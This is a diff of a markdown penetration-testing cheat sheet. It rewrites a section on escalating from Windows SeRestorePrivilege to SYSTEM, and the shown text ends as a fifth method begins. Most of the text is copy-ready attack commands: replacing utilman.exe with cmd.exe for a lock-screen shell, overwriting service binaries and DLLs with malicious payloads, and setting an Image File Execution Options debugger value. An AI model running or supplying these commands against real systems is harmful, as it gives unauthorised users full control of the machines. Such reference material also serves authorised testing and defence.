@@ -346,36 +346,67 @@ Invoke-BackupOperatorToDA -TargetDC dc01.domain.local -OutputPath C:\Temp\
 
 ## 5. SeRestorePrivilege → Write Any File → SYSTEM
 
-**Allows writing to any file on the system**, bypassing DACL/ACL. Escalate by overwriting system binaries or DLL hijacking.
+Grants **write access to any file on the system, regardless of the file's ACL**. This opens up numerous possibilities for escalation, including the ability to **modify services**, perform **DLL Hijacking**, and set **debuggers** via Image File Execution Options.
 
-### Method 1: DLL Hijacking — Service Binary Replacement
+> **References:** [Priv2Admin — SeRestorePrivilege](https://github.com/gtworek/Priv2Admin), [PrivFu PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeRestorePrivilegePoC)
+
+### Method 1: Replace utilman.exe (HackTricks Recommended)
+
+```powershell
+# 1. Launch PowerShell/ISE with SeRestore privilege present
+# 2. Enable the privilege
+# https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1
+Import-Module .\EnableSeRestorePrivilege.ps1
+Enable-SeRestorePrivilege
+
+# 3. Replace utilman.exe with cmd.exe
+Rename-Item C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+Rename-Item C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+
+# 4. Lock the console and press Win+U → SYSTEM shell
+```
+
+> **Note:** This attack may be detected by some AV software.
+
+### Method 2: Replace Service Binaries
 
 ```cmd
-:: 1. Find a service running as SYSTEM with a writable or replaceable binary
+:: Alternative approach — replace service binaries stored in "Program Files"
+
+:: 1. Find a service running as SYSTEM with a replaceable binary
 sc query state= all
 sc qc <SERVICE_NAME>
 
-:: 2. Use robocopy with /B (backup mode — also uses SeRestorePrivilege for write)
-:: Replace the service binary with a malicious payload
-robocopy /B C:\Temp\ "C:\Program Files\VulnService\" malicious.exe
+:: 2. Replace the service binary with a malicious payload
+copy /Y C:\Temp\malicious.exe "C:\Program Files\VulnService\service.exe"
 
 :: 3. Restart the service
 sc stop <SERVICE_NAME>
 sc start <SERVICE_NAME>
 ```
 
-### Method 2: Overwrite utilman.exe or sethc.exe
+### Method 3: Image File Execution Options (Debugger)
 
 ```cmd
-:: Replace utilman.exe with cmd.exe (Sticky Keys attack)
-robocopy /B C:\Windows\System32 C:\Temp utilman.exe
-robocopy /B C:\Temp C:\Windows\System32 cmd.exe /A-:R
-ren C:\Windows\System32\cmd.exe utilman.exe
+:: SeRestorePrivilege allows writing to protected registry keys
+:: Set a debugger to execute an arbitrary payload when the target program launches
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Temp\shell.exe" /f
 
-:: At lock screen: Win+U → SYSTEM cmd.exe
+:: At lock screen: Win+U → shell.exe runs as SYSTEM
 ```
 
-### Method 3: Registry Key Modification
+### Method 4: DLL Hijacking
+
+```cmd
+:: Overwrite a DLL loaded by a SYSTEM service with a malicious one
+copy /Y C:\Temp\malicious.dll "C:\Program Files\VulnService\missing.dll"
+
+:: Restart the service to load the DLL
+sc stop <SERVICE_NAME>
+sc start <SERVICE_NAME>
+```
+
+### Method 5: Registry Key Modification
 
 ```powershell
 # SeRestorePrivilege allows writing to protected registry keys
